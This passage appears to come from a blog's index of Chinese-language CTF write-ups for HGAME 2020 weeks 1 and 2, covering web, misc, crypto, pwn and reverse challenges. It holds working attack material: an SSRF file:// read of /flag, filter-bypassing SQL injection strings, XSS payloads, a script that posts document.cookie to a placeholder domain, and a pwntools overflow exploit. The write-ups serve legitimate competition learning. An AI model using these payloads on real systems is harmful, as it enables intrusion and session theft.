     if (@$url_array['host'] !== \"localhost\" && $url_array['host'] !== \"timgsa.baidu.com\") {\n            return false;\n        }   \n        $c = curl_init();\n        curl_setopt($c, CURLOPT_URL, $img_url);\n        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);\n        $res = curl_exec($c);\n        curl_close($c);\n        $avatar = base64_encode($res);\n\n        if(filter_var($img_url, FILTER_VALIDATE_URL)) {\n            return $avatar;\n        }\n    }\n    else {\n        return base64_encode(file_get_contents(\"static/logo.png\"));\n    }\n}\n?>\n```\n意思是要传入一个url且必须从localhost或者timgsa.baidu.com开始  \ncurl有http和file两种协议，当\n```url=file://www.baidu.com/etc/passwd```\n时,会直接读取/etc/password的内容，题目说明了flag在根目录下，所以在图片url处插入\n```file://localhost/flag```，然后用burpsuite借包查看返回的base64值\n\n### Cosmos的留言板-1\n先测试一下，发现过滤了select和空格\n[sql注入_过滤空格和注释符](https://www.cnblogs.com/peterpan0707007/p/7501507.html)\nselect可以通过大小写绕过，空格可以用/\\*\\*/代替,爆表```'/**/union/**/select/**/concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/having'1'='1```\n得到:f1aggggggggggggg  \n爆段名\n```'/**/union/**/seLect/**/concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='f1aggggggggggggg'/**/having/**/'1'='1```\n得到:fl4444444g\n爆值\n```'/**/union/**/seLect/**/fl4444444g/**/from/**/f1aggggggggggggg/**/having/**/'1'='1```\n### Cosmos的新语言\n\n```\n<?php\nhighlight_file(__FILE__);\n$code = file_get_contents('mycode');\neval($code);\n\n\nJzgCoycIGwIBr0qhJ1IQn05IoQWnoxb1GyuFryOLJ2cBEIV2G2gXZ05LFw4=\n```\nqwq居然访问/mycode就可以得到源码\n```php\nfunction encrypt($str){\n    $result = '';\n    for($i = 0; $i &lt; strlen($str); $i++){\n        $result .= chr(ord($str[$i]) + 1);\n    }\n    return $result;\n}\n\necho(encrypt(strrev(str_rot13(encrypt(base64_encode(strrev(strrev(str_rot13(base64_encode(base64_encode($_SERVER['token'])))))))))));\n\nif(@$_POST['token'] === $_SERVER['token']){\n    echo($_SERVER['flag']);\n}\n```\n意思就是发送的token要和解密后的server的token一致,但是发现每刷新一次，加密的方法与顺序都会变，所以要写脚本来实现解密，思路是得到源码中对token加密的这一行，再通过字符串比较判断所使用的函数  \n[python3网络爬虫开发实战](https://python3webspider.cuiqingcai.com/)\n(什么都不会的感觉太惨了= =)  \n顺手贴一个小语的wp来学习qwq  \n[Hgame-week2-writeup](http://www.xi4oyu.top/1966f4b8/#more)\n写脚本(照抄小语的)- -大概就是给自己加深下印象的...\n不知道为啥= =试了好几次都不行，出现各种错误，后来突然又行了...\n```python\n#py3\nfrom lxml import etree\nfrom requests import Session\nimport re\nimport base64\n\nse=Session()\n\n#get the encode\nurl='http://c339168464.php.hgame.n3ko.co/'\nr = se.get(url)\nhtml = etree.HTML(r.text)\nenc_code=html.xpath('//html/body/text()')[0]\n\n#get the method\n_url='http://c339168464.php.hgame.n3ko.co/mycode'\n_r=se.get(_url)\n_html = etree.HTML(_r.text)\np = r'echo\\((.*)\\(\\$_SERVER'#转义字符r,通过正则选取范围\nmethod=re.search(p,_r.text).group(1).split('(')\n\ndef rot13(s):\n    result = \"\"\n    for v in s:\n        c = ord(v)\n        if c >= ord('a') and c <= ord('z'):\n            if c > ord('m'):\n                c -= 13\n            else:\n                c += 13\n        elif c >= ord('A') and c <= ord('Z'):\n            if c > ord('M'):\n                c -= 13\n            else:\n                c += 13\n        result += chr(c)\n    return result\n\ndef decrypt(s):\n    res=''\n    for ch in s:\n        res+=chr(ord(ch)-1)\n    return res\n\nfor m in method:\n    if m == 'base64_encode':\n        enc_code=base64.b64decode(enc_code)\n    elif m =='encrypt':\n        enc_code=decrypt(enc_code)\n    elif m =='str_rot13':\n        enc_code=rot13(enc_code)\n    elif m == 'strrev':\n        enc_code=enc_code[::-1]\n\n#get the response\nr_=se.post('http://c339168464.php.hgame.n3ko.co/',data={'token': enc_code})\nflag=r_.text\nprint(flag)\n```\n### Cosmos的聊天室\n点击Flag is here的button后，出现提示\n![](wp2_img/03.png)\n那么应该是通过xss获取管理员cookie\n[ctf_web_cookie窃取](https://ctf-wiki.github.io/ctf-wiki/web/xss-zh/#cookies)\n当我们输入标签<\\img\\>时，查看源代码发现标签被过滤，通过\n```\n<!--\n```\n注释掉后面的<span>,而浏览器的容错性允许我们最后不用加>来闭合标签\n[Xss小游戏通关秘籍](https://zhuanlan.zhihu.com/p/75619278)\n[xss练习记录](https://www.kingkk.com/2018/08/xss%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/)\n于是我们发送\n```\n<img src=x onerror=\"alert(1)\"<!--\n```\n源代码中显示![](wp2_img/04.png)\n发现这个alert变大写了，采用html实体编码绕过(对alert进行unicode编码)\n```\n<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#49;&#34;&#41;\"<!--\n```\n发现可以成功执行。\n对于md5(code)[:6] == 11036f来说，要求md5值的前六位要做到相等。\n[Hgame-2020——WEB](http://www.pdsdt.lovepdsdt.com/index.php/2020/02/04/hgame-2020-web/#Cosmos-3)\n对验证码有\n```python\n#py3\nimport hashlib\n\nfor i in range(1, 100000000):\n    #s = hashlib.md5(str(i)).hexdigest()[0:8]\n    #s = hashlib.md5(str(i)).hexdigest()[:6]\n    s = hashlib.md5(str(i).encode(\"utf-8\")).hexdigest()[0:6]\n    if s == \"db97b8\":\n        print(i)\n        break\n```\n[hgame2020week2_offical](https://github.com/vidar-team/Hgame2020_writeup/tree/master/week2)\n之后就直接看官方wp了- -还有小语的wp(靠小语wp过日子)\n其实验证码应该是7-8位(- -以我有限的样本来说)  \n[xiaoyu的wp](http://www.xi4oyu.top/1966f4b8/)  \n关于\n```\n(function(){\n    var img = new Image();\n    img.src='http://我的域名/?token='+document.cookie;\n})();\n```\n有\n[Document.cookie](https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie)","tags":["vidar"]},{"title":"hgame2020week1_wp","url":"/2020/01/25/hgame2020week1-wp/","content":"  \n感谢出题人的耐心解答...  \n= =可惜大二了才刚刚开始....  \npy出题人虽然可耻但有用(X\n\n## web  \n### Cosmos的博客  \n![](01.png)\n.git源码泄露   \npayload：http://cosmos.hgame.n3ko.co/.git/config  \n![](03.png)\n把github上的仓库git clone下来再进行回滚  \ngit clone https://github.com/FeYcYodhrPDJSru/8LTUKCL83VLhXbc  \ncd 8LTUKCL83VLhXbc  \ngit log  \n![](04.png)\ncommit 后面就是对应的版本id  \n![](05.png)\nBase64解码之后就可以得到flag\n\n### 接头霸王  \n看见题目就想到请求头，用postman一步步进行修改\n![](06.png)\n根据提示在请求头中一步步添加  \nreferer:https://vidar.club/  \nX-Forwarded-For:127.0.0.1(You need to visit locally)  \nUser-Agent：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Cosmos/78.0.3904.108 Safari/537.36(use Cosmos Brower)\n之后提示\n![](11.png)\n看一下响应头\n![](12.png)\n![](08.png)\n因为请求方式是POST，所以 if-Unmodified-Since:Tue,15 Nov 2099 00:00:00 GMT  \n\n### Code World  \nf12看源码\n![](14.png)\n发现提示，用burpsuite抓包\n![](15.png)  \n![](45.png)\n405是指method not allowed，所以把get改成post\n![](17.png)\n因为+会被当作空格处理，所以用url的%2b\n![](18.png)\n\n### 鸡尼泰玫  \n发现是个小游戏，先玩一下，输掉之后发现有提示：积分达到30000才能拿到flag  \nF12看一下源码\n![](13.png)\n在console中直接输入storageScore=30000;globalScore=30000，覆盖原值  \n再开始玩游戏，直接输掉之后积分超过30000了，就可以看到flag\n\n## Misc  \n### 欢迎参加HGame！  \n看这个字符串以为是什么特殊的编码，google搜不到就百度一下  \n用base64解码，解出来是morse码，再在线解一下就可以得到flag  \n### 壁纸  \nwinhex打开后发现含有flag.txt文件并且尾部有提示：passsword is picture ID  \n后来才知道这个id指的是p站上的图片id…  \n图片里有个压缩包(PK开头)  \nforemost 图片名.jpg  \n分离得到一个加密压缩包，输入图片id  \ntxt里是unicode码，在线解码下得到flag   \n### 克苏鲁神话  \n打开bacon.txt，看名字是培根加密  \n![](22.png)\n根据这个解密，得到flaghiddenindoc这个提示，但是这个不是密码  \n后来搜索到明文攻击，用zip不行所以用7z  \n解压后得到一个doc文件，选择隐藏文字功能flag就可以显示了    \n### 签到题ProPlus  \n根据提示进行栅栏解密，凯撒解密，密码为大写\n![](23.png)\n解压之后得到OK.txt，在线okk解码，发现base32的提示，base32解码后再base64，再转换为文本，发现开头是png，于是转成16进制，复制进winhex保存为png可得二维码，扫一下就有flag了  \n### 每日推荐  \n（感谢出题人的耐心解答qwq）  \n（一开始直接用foremost分离文件，再winrar修复文件是不行的…）  \n通过foremost可以看到里边有zip文件  \n在wireshark里打开后，搜索zip，找到了对应的包  \n![](26.png)\n导出后发现有提示密码为六位数字，用AAPR爆破得到密码  \n解压后得到一个mp3文件，用audacity打开，目测一下波形没什么奇怪的地方（还挺好听\n再看看频谱图得到flag  \n## Crypto  \n### infantRSA  \n给出数据如下  \np = 681782737450022065655472455411;  \nq = 675274897132088253519831953441;  \ne = 13;  \nc=pow(m,e,p * q)=275698465082361070145173688411496311542172902608559859019841  \n![](24.png)\n所以已知pqec的话先求出d，再求m就好  \n```python\nimport gmpy2\n\np=681782737450022065655472455411\nq=675274897132088253519831953441\ne=13\nc=275698465082361070145173688411496311542172902608559859019841\ns=(p-1)*(q-1)\nd=long(gmmpy2.invert(e,s))\nn=p*q\nm=pow(c,d,n)\nres=m.to_bytes(m.bit_length(),byteorder='big')\nprint(res)\n```\n### Affine\n这题直接改了网上的脚本  \na.b.flag都是未知的，但是我们知道密文和明文中的hgame，于是先求a和b\n```python\nimport gmpy2\nfrom Crypto.Util.number inverse\n\nTABLE = 'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'\nMOD = len(TABLE)\n\npre=[12,11,7,6,18]\npost=[46,33,43,30,0]\nfor a in range(MOD):\n\tif GCD(a,MOD)!=1:\n\t\tcontinue\n\tinv_a=inverse(a,MOD)\n\tfor b in range(MOD):\n\t\tq=1\n\t\tfor i in range(5):\n\t\t\tif(inv_a*(post[i]-b))%MOD!=pre[i]:\n\t\t\t\tq=0\n\t\t\t\tbreak\n\t\tif(q):\n\t\t\tprint(a,b)\n\t\t\t#13,14\n```\nab求出后可以求得完整的明文\n```python\nimport gmpy2\nfrom Crypto.Util.number inverse\n\nTABLE = 'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'\nMOD = len(TABLE)\na=13\nb=14\ninv_a=inverse(a,MOD)\ncipher='A8I5z{xr1A_J7ha_vG_TpH410}'\nflag=''\nfor p in cipher:\n\ti=TABLE.find(p)\n\tif i==-1:\n\t\tflag+=p\n\telse:\n\t\tii=(inv_a*(i-b))%MOD\n\t\tflag+=TABLE[ii]\nprint(flag)\n```\n### Reorder\n这题一开始是真的懵比…..后来问了一下lurk  \n发现输入某个字符后，返回后的字符所在位置就是所对应的密文  \n![](00.png)\n输入  \n0  \n00  \n000  \n0000  \n00000  \n发现返回的位置和hgame相对应，之后一直添加输入数量，再观察每次新增的位置所对应的字符就好啦~  \n## PWN\n### Hard_AAAAA\n感谢C老板的耐心解答，顺便把坑都踩了一遍….  \n下载之后先例常checksec（感觉保护开没开其实影响不是很大…..也可能是因为我不懂） \nIda启动！f5！  \n![](31.png)\n![](32.png)\n可以通过gets()使得s溢出覆盖v5的值，从而满足if内的条件，执行backdoor()函数  \ns与v5的相对距离为0xAC-0x31,这一段用随便什么数据填充:’a’ * (0xAC-0x31)  \n之后要满足memcmp的条件即memcmp(“0O0o”,&v5,7u)==0  \n在7个内存单元内，v5能和“0O0o”相等（….没注意到7…）  \n双击memcmp中的“0O0o”，跳转  \n![](33.png)\n发现和”O0”相邻，就是说比较完“0O0o”后会继续比较“O0”  \n所以构造payload=’a’ * (0xAC-0x31)+’ 0O0o\\00O0’(之前还打成了’0O0o\\\\\\00O0’,我是真的蠢)  \n```python\nfrom pwn import *\np=remote(\"47.103.214.163\",\"20000\")\np.recvuntil(\"Let's 0O0o\\\\0O0!\")\npayload='a'*(0xAC-0x31)+'0O0o\\00O0'\np.sendline(payload)\np.interactive()\n```\n连上后输入ls查看目录，发现有个flag，再cat flag读取内容就好了  \n## Reverse\n### maze\nIda启动！f5！  \n![](39.png)\n猜测是方向键，选中数字按R后就会变成dswa(常用方向键)  \n![](40.png)\n![](41.png)\n代码给出了迷宫范围(上下限)以及v5要走的路线(0上)  \n先看看v5的行走范围，即迷宫地图，点进unk_602080 \n\n![](42.png)  \n\n长这样，选中unk_602080和unk_    60247C间的内容按a可以简单合并一下，标记好出口和入口位置  \n通过代码分析，上下移动对应64个step，左右对应4个，所以删除掉多余的数据（我是手动删….）  \n![](44.png)\n其中上边的(0是入口，最后的(0是出口，可以很明显看到走出迷宫的路径  \n行走的方向键加上hgame{}就是flag\n","tags":["vidar"]}]